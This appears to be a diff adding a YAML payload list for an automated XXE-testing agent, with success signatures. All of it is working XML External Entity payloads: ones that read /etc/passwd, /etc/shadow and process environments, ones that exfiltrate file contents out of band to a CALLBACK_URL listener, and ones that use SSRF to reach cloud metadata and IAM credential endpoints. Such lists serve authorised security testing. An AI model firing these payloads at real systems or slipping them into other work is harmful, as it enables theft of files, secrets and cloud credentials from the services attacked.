@@ -1,0 +1,133 @@
+# XML External Entity (XXE) injection payloads — seed list for the XXE agent
+#
+# Used against any endpoint that accepts XML input (Content-Type: application/xml,
+# text/xml, application/soap+xml) or where a parameter is embedded inside an XML
+# document before parsing. The agent tries basic file read first, then OOB exfiltration
+# when no content is reflected, and finally SSRF variants to reach internal services.
+#
+# The CALLBACK_URL placeholder is replaced at runtime with the collaborator listener URL,
+# following the same pattern as ssrf.yaml uses COLLAB_HOST/COLLAB_PORT.
+
+payloads:
+  basic_file_read:
+    # Linux — reads /etc/passwd and inlines the content into the XML response
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]>
+      <root>&xxe;</root>
+    # Windows — reads win.ini and system hosts file
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>
+      <root>&xxe;</root>
+
+  oob_dtd:
+    # Blind OOB XXE — exfiltrates data via an HTTP request to the collaborator listener.
+    # The external DTD hosted at CALLBACK_URL instructs the parser to build and send
+    # a second request containing the target file contents.
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>
+      <root>&exfil;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % dtd SYSTEM "CALLBACK_URL/xxe-oob.dtd">
+        %dtd;
+      ]>
+      <root/>
+    # Direct OOB ping — confirms XXE exists even without file read
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "CALLBACK_URL/ping">]>
+      <root>&xxe;</root>
+
+  ssrf_internal:
+    # XXE-based SSRF — forces the XML parser to fetch internal HTTP endpoints
+    # AWS instance metadata
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+      <root>&xxe;</root>
+    # GCP metadata
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
+      <root>&xxe;</root>
+    # Localhost services
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]>
+      <root>&xxe;</root>
+
+  parameter_entity:
+    # Parameter entity variants — bypass parsers that block general entities (&xxe;)
+    # but still resolve parameter entities (%xxe;) in internal subsets
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % local SYSTEM "file:///etc/passwd">
+        <!ENTITY % wrapper "<!ENTITY send SYSTEM 'CALLBACK_URL/?x=%local;'>">
+        %wrapper;
+      ]>
+      <root>&send;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+        %xxe;
+      ]>
+      <root/>
+    # DOCTYPE-less variant for parsers that reconstruct DOCTYPE from a namespace
+    - "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>"
+
+  cdata_bypass:
+    # CDATA section wrapping — forces the parser to treat file content as raw text,
+    # preventing the parser from choking on special characters in the exfiltrated file
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % start "<![CDATA[">
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % end "]]>">
+        <!ENTITY % wrapper "<!ENTITY joined '%start;%file;%end;'>">
+        %wrapper;
+      ]>
+      <root>&joined;</root>
+    # SVG vector (useful when only image uploads accept XML)
+    - |
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
+
+# Detection signatures — matched against raw response body (case-insensitive)
+match_signatures:
+  - 'root:x:0:0'
+  - '\[boot loader\]'
+  - 'ami-id'
+  - 'computeMetadata'
